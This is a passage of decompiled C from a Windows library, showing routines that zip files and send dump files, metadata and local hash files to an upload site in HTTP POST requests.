          if (iVar10 + -1 < 0) {
            FUN_100579ee(local_28);
          }
        }
      }
      else {
        piVar5 = (int *)FUN_10010440(piVar7[5]);
        local_30 = piVar5;
      }
    }
    else {
      FUN_1001c6f0(L"HomeSite",&local_30,0,0);
      piVar5 = local_30;
    }
  }
  else {
    puVar12 = &DAT_10083be4;
    do {
      uVar1 = *puVar11;
      bVar13 = uVar1 < *puVar12;
      if (uVar1 != *puVar12) {
LAB_1000cef3:
        uVar6 = -(uint)bVar13 | 1;
        goto LAB_1000cef8;
      }
      if (uVar1 == 0) break;
      uVar1 = puVar11[1];
      bVar13 = uVar1 < puVar12[1];
      if (uVar1 != puVar12[1]) goto LAB_1000cef3;
      puVar11 = puVar11 + 2;
      puVar12 = puVar12 + 2;
    } while (uVar1 != 0);
    uVar6 = 0;
LAB_1000cef8:
    if (uVar6 == 0) goto LAB_1000cf05;
  }
  piVar9 = (int *)FUN_1000ae10(&local_2c);
  if (*piVar9 == 0) {
    iVar10 = 0;
  }
  else {
    iVar10 = *piVar9 + 0xc;
  }
  FUN_10006250("upload site: %s\n",iVar10);
  if (local_2c != (int *)0x0) {
    LOCK();
    iVar10 = *local_2c;
    *local_2c = iVar10 + -1;
    UNLOCK();
    if (iVar10 + -1 < 0) {
      FUN_100579ee(local_2c);
    }
  }
  if (piVar5 == (int *)0x0) goto LAB_1000d36f;
  if (piVar5[2] != 0) {
    puVar11 = (ushort *)(piVar5 + 3);
    if (puVar11 != (ushort *)0x0) {
      puVar12 = &DAT_10083be4;
      do {
        uVar1 = *puVar11;
        bVar13 = uVar1 < *puVar12;
        if (uVar1 != *puVar12) {
LAB_1000d246:
          uVar6 = -(uint)bVar13 | 1;
          goto LAB_1000d24b;
        }
        if (uVar1 == 0) break;
        uVar1 = puVar11[1];
        bVar13 = uVar1 < puVar12[1];
        if (uVar1 != puVar12[1]) goto LAB_1000d246;
        puVar11 = puVar11 + 2;
        puVar12 = puVar12 + 2;
      } while (uVar1 != 0);
      uVar6 = 0;
LAB_1000d24b:
      if (uVar6 == 0) goto LAB_1000d35c;
    }
    local_24 = local_34;
    local_34 = (int *)0x0;
    local_8 = CONCAT31(local_8._1_3_,0x1b);
    local_20 = param_1 + 0x2c;
    local_1c = param_1 + 0x30;
    local_18 = param_1 + 0x34;
    FUN_1000c520(&local_34);
    piVar9 = local_34;
    if ((local_34 != (int *)0x0) && (local_34[2] != 0)) {
      uVar6 = 0;
      do {
        if ((*(&local_24)[uVar6] != 0) && (*(&local_24)[uVar6] != -0xc)) {
          FUN_100106a0(&local_34,2);
        }
        uVar6 = uVar6 + 1;
      } while (uVar6 < 4);
    }
    local_28 = (int *)0x0;
    local_8._0_1_ = 0x1c;
    FUN_1000c520(&local_28);
    piVar7 = local_28;
    if (local_28 != (int *)0x0) {
      if (local_28[2] != 0) {
        local_2c = (int *)0x1;
        do {
          if ((*(&local_24)[(int)local_2c] != 0) && (*(&local_24)[(int)local_2c] != -0xc)) {
            FUN_100106a0(&local_28,2);
          }
          local_2c = (int *)((int)local_2c + 1);
        } while (local_2c < (int *)0x4);
      }
      LOCK();
      iVar10 = *piVar7;
      *piVar7 = iVar10 + -1;
      UNLOCK();
      if (iVar10 + -1 < 0) {
        FUN_100579ee(piVar7);
      }
    }
    if (piVar9 != (int *)0x0) {
      LOCK();
      iVar10 = *piVar9;
      *piVar9 = iVar10 + -1;
      UNLOCK();
      if (iVar10 + -1 < 0) {
        FUN_100579ee(piVar9);
      }
    }
  }
LAB_1000d35c:
  LOCK();
  iVar10 = *piVar5;
  *piVar5 = *piVar5 + -1;
  UNLOCK();
  if (iVar10 + -1 < 0) {
    FUN_100579ee(piVar5);
  }
LAB_1000d36f:
  ExceptionList = local_10;
  FUN_100579df();
  return;
}



/* Function: FUN_1000d390 */

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

void __fastcall FUN_1000d390(int param_1)

{
  uint uVar1;
  int *piVar2;
  int iVar3;
  int iVar4;
  int *piVar5;
  int *piVar6;
  int extraout_ECX;
  char *pcVar7;
  undefined4 local_ec;
  undefined4 uStack_e8;
  undefined4 uStack_e4;
  undefined4 uStack_e0;
  undefined4 local_dc;
  undefined4 uStack_d8;
  undefined4 uStack_d4;
  undefined4 uStack_d0;
  undefined4 local_cc;
  undefined4 uStack_c8;
  undefined4 uStack_c4;
  undefined4 uStack_c0;
  undefined1 local_bc [4];
  wchar_t *local_b8;
  int *local_b4;
  int local_b0;
  int *local_8c;
  undefined4 local_78;
  int *local_74;
  int local_70;
  int *local_6c;
  int *local_68;
  int *local_64;
  int *local_60;
  undefined4 local_5c;
  int *local_58;
  int *local_54;
  int *local_50;
  int *local_4c;
  int *local_48;
  undefined4 local_44;
  undefined4 uStack_40;
  undefined4 uStack_3c;
  undefined4 uStack_38;
  undefined4 local_34;
  undefined4 uStack_30;
  undefined4 uStack_2c;
  undefined4 uStack_28;
  undefined4 local_24;
  undefined4 uStack_20;
  undefined8 uStack_1c;
  uint local_14;
  void *local_10;
  undefined1 *puStack_c;
  uint local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_10074780;
  local_10 = ExceptionList;
  local_14 = DAT_100956e0 ^ (uint)&stack0xfffffffc;
  ExceptionList = &local_10;
  local_70 = param_1;
  if (*(int *)(param_1 + 0xc) != 200) goto LAB_1000d7c8;
  FUN_1000ba10(local_14);
  FUN_1001bdb0();
  local_78 = 0;
  local_8 = 0;
  local_b8 = L"POST";
  if (*(int *)(param_1 + 0x38) == 0) {
    iVar3 = 0;
  }
  else {
    iVar3 = *(int *)(param_1 + 0x38) + 0xc;
  }
  FUN_10010ef0(iVar3);
  FUN_1005ff60(&local_ec,0,0x30);
  iVar3 = *(int *)(param_1 + 0x3c);
  local_44 = local_ec;
  uStack_40 = uStack_e8;
  uStack_3c = uStack_e4;
  uStack_38 = uStack_e0;
  local_34 = local_dc;
  uStack_30 = uStack_d8;
  uStack_2c = uStack_d4;
  uStack_28 = uStack_d0;
  local_24 = local_cc;
  uStack_20 = uStack_c8;
  uStack_1c = CONCAT44(uStack_c0,uStack_c4);
  if ((iVar3 != 0) && (iVar3 != -0xc)) {
    if (iVar3 == 0) {
      iVar3 = 0;
    }
    else {
      iVar3 = iVar3 + 0xc;
    }
    iVar4 = FUN_1005a899(iVar3,&local_44);
    iVar3 = extraout_ECX;
    if (iVar4 != 0) {
      uStack_1c = 0;
    }
  }
  local_8 = CONCAT31(local_8._1_3_,2);
  piVar5 = (int *)FUN_10013e00(uStack_30,iVar3);
  local_74 = piVar5;
  if ((local_4c != (int *)0x0) && (local_4c != (int *)0xfffffff4)) {
    FUN_10013f90(&local_74,0);
  }
  if (piVar5 != (int *)0x0) {
    LOCK();
    iVar3 = *piVar5;
    *piVar5 = iVar3 + -1;
    UNLOCK();
    if (iVar3 + -1 < 0) {
      FUN_100579ee(piVar5);
    }
  }
  local_54 = (int *)0x0;
  local_8 = CONCAT31(local_8._1_3_,3);
  FUN_100110e0(&local_54);
  FUN_1001aef0();
  piVar5 = (int *)FUN_100581b4(0x1f);
  if (piVar5 != (int *)0x0) {
    piVar5[1] = 0x10;
    piVar5[2] = 0xc;
    *piVar5 = 0;
    *(undefined8 *)(piVar5 + 3) = s_MetadataFile_10083ce0._0_8_;
    piVar5[5] = s_MetadataFile_10083ce0._8_4_;
    *(undefined1 *)(piVar5[2] + 0xc + (int)piVar5) = 0;
  }
  local_6c = piVar5;
  FUN_1001afb0(&local_4c,&local_6c,&local_54);
  if (piVar5 != (int *)0x0) {
    LOCK();
    iVar3 = *piVar5;
    *piVar5 = iVar3 + -1;
    UNLOCK();
    if (iVar3 + -1 < 0) {
      FUN_100579ee(piVar5);
    }
  }
  FUN_10007b60(&DAT_10084530,0xffffffff);
  if ((local_68 != (int *)0x0) && (local_68[2] != 0)) {
    FUN_10007b60(local_68 + 3,local_68[2]);
  }
  local_60 = (int *)FUN_10007b60(&DAT_10084530,0xffffffff);
  local_5c = 1;
  local_58 = (int *)0x0;
  local_8 = CONCAT31(local_8._1_3_,5);
  if (((local_64 == (int *)0x0) || (piVar5 = local_64 + 3, piVar5 == (int *)0x0)) ||
     ((char)*piVar5 == '\0')) {
    local_58 = (int *)0x0;
LAB_1000d5e0:
    local_b4 = (int *)0x0;
  }
  else {
    local_58 = (int *)FUN_1000c0a0(piVar5,0xffffffff);
    if (local_58 == (int *)0x0) goto LAB_1000d5e0;
    local_b4 = local_58 + 3;
  }
  piVar5 = local_58;
  if (local_60 == (int *)0x0) {
    local_b0 = 0;
    local_8c = (int *)0x0;
  }
  else {
    local_b0 = local_60[2];
    local_8c = local_60 + 3;
  }
  if (*(int *)(param_1 + 0x2c) == 0) {
    iVar3 = 0;
  }
  else {
    iVar3 = *(int *)(param_1 + 0x2c) + 0xc;
  }
  FUN_10049c10(iVar3,local_bc);
  if (piVar5 != (int *)0x0) {
    LOCK();
    iVar3 = *piVar5;
    *piVar5 = iVar3 + -1;
    UNLOCK();
    if (iVar3 + -1 < 0) {
      FUN_100579ee(piVar5);
    }
  }
  if (local_60 != (int *)0x0) {
    LOCK();
    iVar3 = *local_60;
    *local_60 = iVar3 + -1;
    UNLOCK();
    if (iVar3 + -1 < 0) {
      FUN_100579ee(local_60);
    }
  }
  if (local_64 != (int *)0x0) {
    LOCK();
    iVar3 = *local_64;
    *local_64 = iVar3 + -1;
    UNLOCK();
    if (iVar3 + -1 < 0) {
      FUN_100579ee(local_64);
    }
  }
  if (local_68 != (int *)0x0) {
    LOCK();
    iVar3 = *local_68;
    *local_68 = iVar3 + -1;
    UNLOCK();
    if (iVar3 + -1 < 0) {
      FUN_100579ee(local_68);
    }
  }
  if (local_54 != (int *)0x0) {
    LOCK();
    iVar3 = *local_54;
    *local_54 = iVar3 + -1;
    UNLOCK();
    if (iVar3 + -1 < 0) {
      FUN_100579ee(local_54);
    }
  }
  local_8 = local_8 & 0xffffff00;
  if (local_4c != (int *)0x0) {
    LOCK();
    iVar3 = *local_4c;
    *local_4c = iVar3 + -1;
    UNLOCK();
    if (iVar3 + -1 < 0) {
      FUN_100579ee(local_4c);
    }
  }
  *(int *)(param_1 + 0xc) = *(int *)(param_1 + 4);
  if (*(int *)(param_1 + 4) != -1) {
    if (((*(int *)(param_1 + 8) == 0) ||
        (pcVar7 = (char *)(*(int *)(param_1 + 8) + 0xc), pcVar7 == (char *)0x0)) ||
       (*pcVar7 != '\0')) {
      piVar5 = (int *)FUN_100075b0();
    }
    else {
      piVar5 = (int *)FUN_10007ae0();
    }
    local_8._0_1_ = 7;
    local_48 = piVar5;
    iVar3 = FUN_100110e0(param_1 + 0x1c);
    uVar1 = DAT_1009b444;
    if (iVar3 != 0) {
      *(undefined4 *)(param_1 + 0x44) = 1;
      if ((uVar1 & 1) == 0) {
        DAT_1009b444 = uVar1 | 1;
      }
      _DAT_1009b448 = 1;
    }
    FUN_10011280(param_1 + 0x14);
    FUN_10011280(param_1 + 0x10);
    local_50 = (int *)0x0;
    local_8 = CONCAT31(local_8._1_3_,8);
    iVar3 = FUN_100110e0(&local_50);
    piVar2 = local_50;
    if (iVar3 != 0) {
      FUN_1000e6d0(&local_50);
      if (piVar2 == (int *)0x0) {
        piVar6 = (int *)0x0;
      }
      else {
        piVar6 = piVar2 + 3;
      }
      FUN_10006250("TODO: msg-to-scr: \'%s\'\n",piVar6);
    }
    if (piVar2 != (int *)0x0) {
      LOCK();
      iVar3 = *piVar2;
      *piVar2 = iVar3 + -1;
      UNLOCK();
      if (iVar3 + -1 < 0) {
        FUN_100579ee(piVar2);
      }
    }
    if (piVar5 != (int *)0x0) {
      LOCK();
      iVar3 = *piVar5;
      *piVar5 = *piVar5 + -1;
      UNLOCK();
      if (iVar3 + -1 < 0) {
        FUN_100579ee(piVar5);
      }
    }
  }
LAB_1000d7c8:
  ExceptionList = local_10;
  FUN_100579df();
  return;
}



/* Function: FUN_1000d7f0 */

void __fastcall FUN_1000d7f0(int param_1)

{
  int iVar1;
  int *piVar2;
  int iVar3;
  char *pcVar4;
  undefined **ppuVar5;
  int *piVar6;
  undefined4 extraout_ECX;
  undefined4 extraout_ECX_00;
  int *extraout_ECX_01;
  int *extraout_ECX_02;
  undefined4 extraout_ECX_03;
  undefined4 extraout_ECX_04;
  undefined4 extraout_ECX_05;
  int extraout_EDX;
  int *piVar7;
  uint uVar8;
  undefined4 uVar9;
  undefined4 uVar10;
  undefined1 local_cc [4];
  wchar_t *local_c8;
  int *local_c4;
  int local_c0;
  int *local_9c;
  undefined4 local_8c;
  undefined4 local_88;
  uint local_84;
  int *local_74;
  int *local_70;
  int *local_6c;
  int *local_68;
  undefined **local_64 [3];
  int local_58;
  int local_54;
  undefined4 local_50;
  int *local_4c;
  int *local_48;
  int *local_44;
  int *local_40;
  int *local_3c;
  int *local_38;
  int *local_34;
  undefined4 local_30;
  int *local_2c;
  int *local_28;
  int *local_24;
  int *local_20;
  int local_1c;
  int *local_18;
  int *local_14;
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_10074864;
  local_10 = ExceptionList;
  if (((*(int *)(param_1 + 0x10) != 1) || (*(int *)(param_1 + 0xc) != 200)) &&
     (*(int *)(param_1 + 0x18) == 0)) {
    return;
  }
  ExceptionList = &local_10;
  local_1c = param_1;
  FUN_1001bdb0(DAT_100956e0 ^ (uint)&stack0xfffffffc);
  local_8c = 0;
  local_20 = (int *)(extraout_EDX + 0x38);
  local_8 = 0;
  local_c8 = L"POST";
  if (*local_20 == 0) {
    iVar1 = 0;
  }
  else {
    iVar1 = *local_20 + 0xc;
  }
  FUN_10010ef0(iVar1);
  piVar7 = (int *)0x0;
  local_40 = (int *)0x0;
  local_64[0] = CZipIOMem::vftable;
  local_58 = 0;
  local_54 = 0;
  local_50 = 0;
  uVar9 = 0x40a8;
  piVar2 = (int *)FUN_10058463(0x40a8,&DAT_10098020);
  local_2c = piVar2;
  if (piVar2 == (int *)0x0) {
    piVar2 = (int *)0x0;
    local_14 = (int *)0x0;
    uVar9 = extraout_ECX;
  }
  else {
    *piVar2 = (int)local_64;
    piVar2[1] = 0;
    piVar2[2] = 0;
    piVar2[3] = 0;
    local_14 = piVar2;
    FUN_10036f90();
    piVar2[0x1022] = 0;
    piVar2[0x1023] = 0;
    piVar2[0x1024] = 0;
    piVar2[0x1025] = 0;
    uVar10 = 0x1000d8e8;
    iVar1 = FUN_100075b0();
    piVar2[0x1026] = iVar1;
    local_8 = CONCAT31(local_8._1_3_,7);
    piVar2[0x1028] = 0;
    piVar2[0x1027] = (int)local_64;
    piVar2[0x1029] = 0;
    FUN_100371a0(0,uVar9,uVar10);
    uVar9 = extraout_ECX_00;
  }
  iVar1 = local_1c;
  local_8._0_1_ = 4;
  if (piVar2 != (int *)0x0) {
    if (*(int *)(local_1c + 0x3c) == 0) {
      iVar3 = 0;
    }
    else {
      iVar3 = *(int *)(local_1c + 0x3c) + 0xc;
    }
    FUN_10006250("upload: adding %s\n",iVar3);
    iVar3 = *(int *)(iVar1 + 0x3c);
    if (iVar3 == 0) {
      iVar3 = 0;
    }
    else {
      iVar3 = iVar3 + 0xc;
    }
    FUN_100372d0(iVar3,0);
    local_28 = (int *)0x0;
    local_8 = CONCAT31(local_8._1_3_,8);
    iVar1 = *(int *)(iVar1 + 0x3c);
    if (iVar1 == 0) {
LAB_1000d9a3:
      local_28 = (int *)0x0;
LAB_1000d9a8:
      ppuVar5 = &PTR_10083554;
    }
    else {
      pcVar4 = (char *)(iVar1 + 0xc);
      if ((pcVar4 == (char *)0x0) || (*pcVar4 == '\0')) goto LAB_1000d9a3;
      local_28 = (int *)FUN_1000c0a0(pcVar4,*(undefined4 *)(iVar1 + 8));
      if ((local_28 == (int *)0x0) || (local_28[2] == 0)) goto LAB_1000d9a8;
      ppuVar5 = (undefined **)(local_28 + 3);
    }
    piVar2 = local_28;
    FUN_10035ef0(ppuVar5,1,0,0);
    uVar8 = 0;
    local_8._0_1_ = 9;
    piVar7 = extraout_ECX_01;
    if (local_84 != 0) {
      do {
        FUN_10036da0(&local_48,uVar8);
        local_8 = CONCAT31(local_8._1_3_,10);
        piVar2 = (int *)FUN_1000ae10(&local_70);
        if (*piVar2 == 0) {
          iVar1 = 0;
        }
        else {
          iVar1 = *piVar2 + 0xc;
        }
        FUN_10006250("upload: adding %s\n",iVar1);
        if (local_70 != (int *)0x0) {
          LOCK();
          iVar1 = *local_70;
          *local_70 = iVar1 + -1;
          UNLOCK();
          if (iVar1 + -1 < 0) {
            FUN_100579ee(local_70);
          }
        }
        if (local_48 != (int *)0x0) {
          LOCK();
          iVar1 = *local_48;
          *local_48 = iVar1 + -1;
          UNLOCK();
          if (iVar1 + -1 < 0) {
            FUN_100579ee(local_48);
          }
        }
        FUN_10036da0(&local_4c,uVar8);
        local_8._0_1_ = 0xb;
        piVar2 = (int *)FUN_1000ae10(&local_44);
        local_8 = CONCAT31(local_8._1_3_,0xc);
        if (*piVar2 == 0) {
          iVar1 = 0;
        }
        else {
          iVar1 = *piVar2 + 0xc;
        }
        FUN_100372d0(iVar1,0);
        if (local_44 != (int *)0x0) {
          LOCK();
          iVar1 = *local_44;
          *local_44 = iVar1 + -1;
          UNLOCK();
          if (iVar1 + -1 < 0) {
            FUN_100579ee(local_44);
          }
        }
        local_8._0_1_ = 9;
        piVar7 = local_4c;
        if (local_4c != (int *)0x0) {
          LOCK();
          iVar1 = *local_4c;
          *local_4c = iVar1 + -1;
          UNLOCK();
          if (iVar1 + -1 < 0) {
            FUN_100579ee(local_4c);
            piVar7 = extraout_ECX_02;
          }
        }
        uVar8 = uVar8 + 1;
        piVar2 = local_28;
      } while (uVar8 < local_84);
    }
    FUN_10037e50(piVar7);
    piVar7 = (int *)FUN_100070d0(local_58,local_54 - local_58);
    local_2c = local_14;
    local_8._0_1_ = 0xe;
    local_40 = piVar7;
    if (local_14[0x1028] != 0) {
      FUN_10037e50(local_14);
    }
    piVar6 = (int *)local_14[0x1026];
    if (piVar6 != (int *)0x0) {
      LOCK();
      iVar1 = *piVar6;
      *piVar6 = iVar1 + -1;
      UNLOCK();
      if (iVar1 + -1 < 0) {
        FUN_100579ee(piVar6);
      }
    }
    local_14[1] = 0;
    local_14[2] = 0;
    thunk_FUN_100579ee(local_14);
    FUN_1000ba10();
    thunk_FUN_100579ee(local_88);
    uVar9 = extraout_ECX_03;
    if (piVar2 != (int *)0x0) {
      LOCK();
      iVar1 = *piVar2;
      *piVar2 = iVar1 + -1;
      UNLOCK();
      if (iVar1 + -1 < 0) {
        FUN_100579ee(piVar2);
        uVar9 = extraout_ECX_04;
      }
    }
  }
  if (local_58 != 0) {
    thunk_FUN_100579ee(local_58);
    local_58 = 0;
    local_54 = 0;
    local_50 = 0;
    uVar9 = extraout_ECX_05;
  }
  if (piVar7 == (int *)0x0) {
    iVar1 = 0;
  }
  else {
    iVar1 = piVar7[2];
  }
  local_8 = CONCAT31(local_8._1_3_,0xf);
  piVar2 = (int *)FUN_10013e00(iVar1,uVar9);
  local_68 = piVar2;
  if ((local_18 != (int *)0x0) && (local_18 != (int *)0xfffffff4)) {
    FUN_10013f90(&local_68,0);
  }
  if (piVar2 != (int *)0x0) {
    LOCK();
    iVar1 = *piVar2;
    *piVar2 = iVar1 + -1;
    UNLOCK();
    if (iVar1 + -1 < 0) {
      FUN_100579ee(piVar2);
    }
  }
  local_24 = (int *)0x0;
  local_8._0_1_ = 0x10;
  FUN_100110e0(&local_24);
  local_14 = (int *)0x0;
  local_8 = CONCAT31(local_8._1_3_,0x11);
  FUN_100110e0(&local_14);
  piVar2 = (int *)FUN_10007b60(&DAT_10083da4,0xffffffff);
  local_2c = local_24;
  if (local_24 == (int *)0x0) {
    piVar6 = (int *)0x0;
  }
  else {
    piVar6 = local_24 + 3;
  }
  local_14 = piVar2;
  FUN_10006250(" - %s\n",piVar6);
  if (piVar2 == (int *)0x0) {
    piVar6 = (int *)0x0;
  }
  else {
    piVar6 = piVar2 + 3;
  }
  FUN_10006250(" - %s\n",piVar6);
  FUN_1001aef0();
  piVar6 = (int *)FUN_100581b4(0x1f);
  if (piVar6 != (int *)0x0) {
    piVar6[1] = 0x10;
    piVar6[2] = 0xc;
    *piVar6 = 0;
    *(undefined8 *)(piVar6 + 3) = s_MetadataFile_10083ce0._0_8_;
    piVar6[5] = s_MetadataFile_10083ce0._8_4_;
    *(undefined1 *)(piVar6[2] + 0xc + (int)piVar6) = 0;
  }
  local_74 = piVar6;
  FUN_1001afb0(&local_18,&local_74,&local_24);
  if (piVar6 != (int *)0x0) {
    LOCK();
    iVar1 = *piVar6;
    *piVar6 = iVar1 + -1;
    UNLOCK();
    if (iVar1 + -1 < 0) {
      FUN_100579ee(piVar6);
    }
  }
  piVar6 = (int *)FUN_100581b4(0x1f);
  if (piVar6 != (int *)0x0) {
    piVar6[1] = 0x10;
    piVar6[2] = 8;
    *piVar6 = 0;
    *(undefined8 *)(piVar6 + 3) = s_DumpFile_10083db4._0_8_;
    *(undefined1 *)((int)piVar6 + piVar6[2] + 0xc) = 0;
  }
  local_6c = piVar6;
  FUN_1001afb0(&local_40,&local_6c,&local_14);
  if (piVar6 != (int *)0x0) {
    LOCK();
    iVar1 = *piVar6;
    *piVar6 = iVar1 + -1;
    UNLOCK();
    if (iVar1 + -1 < 0) {
      FUN_100579ee(piVar6);
    }
  }
  FUN_10007b60(&DAT_10084530,0xffffffff);
  if ((local_3c != (int *)0x0) && (local_3c[2] != 0)) {
    FUN_10007b60(local_3c + 3,local_3c[2]);
  }
  local_34 = (int *)FUN_10007b60(&DAT_10084530,0xffffffff);
  local_30 = 1;
  local_20 = (int *)0x0;
  local_8 = CONCAT31(local_8._1_3_,0x13);
  if (((local_38 == (int *)0x0) || (piVar6 = local_38 + 3, piVar6 == (int *)0x0)) ||
     ((char)*piVar6 == '\0')) {
    local_20 = (int *)0x0;
  }
  else {
    local_20 = (int *)FUN_1000c0a0(piVar6,0xffffffff);
    if (local_20 != (int *)0x0) {
      local_c4 = local_20 + 3;
      goto LAB_1000ddb7;
    }
  }
  local_c4 = (int *)0x0;
LAB_1000ddb7:
  piVar6 = local_20;
  if (local_34 == (int *)0x0) {
    local_c0 = 0;
    local_9c = (int *)0x0;
  }
  else {
    local_c0 = local_34[2];
    local_9c = local_34 + 3;
  }
  if (*(int *)(local_1c + 0x30) == 0) {
    iVar1 = 0;
  }
  else {
    iVar1 = *(int *)(local_1c + 0x30) + 0xc;
  }
  FUN_10049c10(iVar1,local_cc);
  if (piVar6 != (int *)0x0) {
    LOCK();
    iVar1 = *piVar6;
    *piVar6 = iVar1 + -1;
    UNLOCK();
    if (iVar1 + -1 < 0) {
      FUN_100579ee(piVar6);
    }
  }
  if (local_34 != (int *)0x0) {
    LOCK();
    iVar1 = *local_34;
    *local_34 = iVar1 + -1;
    UNLOCK();
    if (iVar1 + -1 < 0) {
      FUN_100579ee(local_34);
    }
  }
  if (local_38 != (int *)0x0) {
    LOCK();
    iVar1 = *local_38;
    *local_38 = iVar1 + -1;
    UNLOCK();
    if (iVar1 + -1 < 0) {
      FUN_100579ee(local_38);
    }
  }
  if (local_3c != (int *)0x0) {
    LOCK();
    iVar1 = *local_3c;
    *local_3c = iVar1 + -1;
    UNLOCK();
    if (iVar1 + -1 < 0) {
      FUN_100579ee(local_3c);
    }
  }
  if (piVar2 != (int *)0x0) {
    LOCK();
    iVar1 = *piVar2;
    *piVar2 = iVar1 + -1;
    UNLOCK();
    if (iVar1 + -1 < 0) {
      FUN_100579ee(piVar2);
    }
  }
  if (local_2c != (int *)0x0) {
    LOCK();
    iVar1 = *local_2c;
    *local_2c = iVar1 + -1;
    UNLOCK();
    if (iVar1 + -1 < 0) {
      FUN_100579ee(local_2c);
    }
  }
  if (piVar7 != (int *)0x0) {
    LOCK();
    iVar1 = *piVar7;
    *piVar7 = iVar1 + -1;
    UNLOCK();
    if (iVar1 + -1 < 0) {
      FUN_100579ee(piVar7);
    }
  }
  if (local_18 != (int *)0x0) {
    LOCK();
    iVar1 = *local_18;
    *local_18 = *local_18 + -1;
    UNLOCK();
    if (iVar1 + -1 < 0) {
      FUN_100579ee(local_18);
    }
  }
  *(undefined4 *)(local_1c + 0xc) = *(undefined4 *)(local_1c + 4);
  ExceptionList = local_10;
  return;
}



/* Function: FUN_1000dee0 */

bool __fastcall FUN_1000dee0(int param_1)

{
  char cVar1;
  uint uVar2;
  int *piVar3;
  int *piVar4;
  int *piVar5;
  int iVar6;
  int iVar7;
  uint uVar8;
  char *pcVar9;
  char *pcVar10;
  undefined4 local_9c;
  wchar_t *local_98;
  int *local_94;
  int local_90;
  undefined4 local_8c;
  undefined4 local_88;
  undefined4 local_84;
  undefined4 local_80;
  undefined4 local_7c;
  undefined4 local_78;
  undefined2 local_70;
  int *local_6c;
  undefined4 local_68;
  undefined4 local_64;
  undefined4 local_60;
  int *local_5c;
  int *local_58;
  int *local_54;
  undefined4 local_50;
  int local_4c;
  uint local_48;
  int *local_44;
  int local_40 [3];
  int *local_34;
  int *local_30;
  int *local_2c;
  int *local_28;
  int *local_24;
  int *local_20;
  undefined2 local_1c;
  int local_18;
  int local_14;
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  puStack_c = &LAB_100748d3;
  local_10 = ExceptionList;
  uVar2 = DAT_100956e0 ^ (uint)&stack0xfffffffc;
  ExceptionList = &local_10;
  iVar7 = 0;
  local_14 = 0;
  if (*(int *)(param_1 + 0x38) == 0) {
    local_40[0] = 0;
  }
  else {
    local_40[0] = *(int *)(param_1 + 0x38) + 0xc;
  }
  if (*(int *)(param_1 + 0x3c) == 0) {
    local_40[1] = 0;
  }
  else {
    local_40[1] = *(int *)(param_1 + 0x3c) + 0xc;
  }
  local_40[2] = 0;
  local_18 = param_1;
  do {
    local_8 = 0xffffffff;
    pcVar9 = (char *)local_40[local_40[2]];
    if (pcVar9 == (char *)0x0) {
      local_14 = iVar7 + 1;
      iVar7 = local_14;
    }
    else if (*(int *)(param_1 + 0xc) == 200) {
      FUN_1000ba10(uVar2);
      local_8c = 0xb;
      local_9c = 0;
      local_70 = 0x50;
      local_6c = (int *)0x0;
      local_90 = 0;
      local_94 = (int *)0x0;
      local_88 = 10000;
      local_84 = 0x1000;
      local_80 = 0x1000;
      local_68 = 0;
      local_64 = 0;
      local_60 = 0;
      local_7c = 0;
      local_78 = 0;
      local_8 = 0;
      local_98 = L"POST";
      FUN_10010ef0(pcVar9);
      local_20 = (int *)0x0;
      if (*pcVar9 == '\0') {
        if ((DAT_1009ac98 & 1) == 0) {
          DAT_1009ac98 = DAT_1009ac98 | 1;
          local_1c = 0;
          DAT_1009ac94 = (int *)FUN_100581b4(0x1f);
          if (DAT_1009ac94 != (int *)0x0) {
            DAT_1009ac94[1] = 0x10;
            DAT_1009ac94[2] = 2;
            *DAT_1009ac94 = 0;
            *(undefined2 *)(DAT_1009ac94 + 3) = local_1c;
            *(undefined1 *)(DAT_1009ac94[2] + 0xc + (int)DAT_1009ac94) = 0;
            DAT_1009ac94[2] = 0;
            *(undefined1 *)(DAT_1009ac94 + 3) = 0;
          }
          FUN_10057b51(&LAB_10078240);
        }
        piVar3 = DAT_1009ac94;
        if (DAT_1009ac94 != (int *)0x0) {
          LOCK();
          *DAT_1009ac94 = *DAT_1009ac94 + 1;
          UNLOCK();
          piVar3 = DAT_1009ac94;
        }
      }
      else {
        pcVar10 = pcVar9;
        do {
          cVar1 = *pcVar10;
          pcVar10 = pcVar10 + 1;
        } while (cVar1 != '\0');
        iVar7 = (int)pcVar10 - (int)(pcVar9 + 1);
        if (iVar7 == 0) {
          piVar3 = (int *)0x0;
        }
        else {
          uVar8 = 0x10;
          if (0x10 < iVar7 + 1U) {
            uVar8 = iVar7 + 1U;
          }
          local_48 = uVar8 + 0xf & 0xfffffff0;
          piVar3 = (int *)FUN_100581b4(local_48 + 0xf);
          if (piVar3 != (int *)0x0) {
            piVar3[1] = local_48;
            *piVar3 = 0;
            piVar3[2] = iVar7;
            FUN_1005d740(piVar3 + 3,pcVar9,iVar7);
            *(undefined1 *)((int)piVar3 + piVar3[2] + 0xc) = 0;
          }
        }
      }
      local_8 = CONCAT31(local_8._1_3_,3);
      local_2c = piVar3;
      FUN_100110e0(&local_20);
      if (piVar3 != (int *)0x0) {
        LOCK();
        iVar7 = *piVar3;
        *piVar3 = iVar7 + -1;
        UNLOCK();
        if (iVar7 + -1 < 0) {
          FUN_100579ee(piVar3);
        }
      }
      FUN_1001aef0();
      piVar3 = (int *)FUN_100581b4(0x1f);
      if (piVar3 != (int *)0x0) {
        piVar3[1] = 0x10;
        piVar3[2] = 0xf;
        *piVar3 = 0;
        *(undefined8 *)(piVar3 + 3) = s_LocalHashesFile_10083dc0._0_8_;
        piVar3[5] = s_LocalHashesFile_10083dc0._8_4_;
        *(undefined2 *)(piVar3 + 6) = s_LocalHashesFile_10083dc0._12_2_;
        *(char *)((int)piVar3 + 0x1a) = s_LocalHashesFile_10083dc0[0xe];
        *(undefined1 *)((int)piVar3 + piVar3[2] + 0xc) = 0;
      }
      local_44 = piVar3;
      FUN_1001afb0(&local_30,&local_44,&local_20);
      if (piVar3 != (int *)0x0) {
        LOCK();
        iVar7 = *piVar3;
        *piVar3 = iVar7 + -1;
        UNLOCK();
        if (iVar7 + -1 < 0) {
          FUN_100579ee(piVar3);
        }
      }
      FUN_10007b60(&DAT_10084530,0xffffffff);
      piVar3 = local_5c;
      if ((local_5c != (int *)0x0) && (local_5c[2] != 0)) {
        FUN_10007b60(local_5c + 3,local_5c[2]);
      }
      piVar4 = (int *)FUN_10007b60(&DAT_10084530,0xffffffff);
      local_50 = 1;
      local_34 = (int *)0x0;
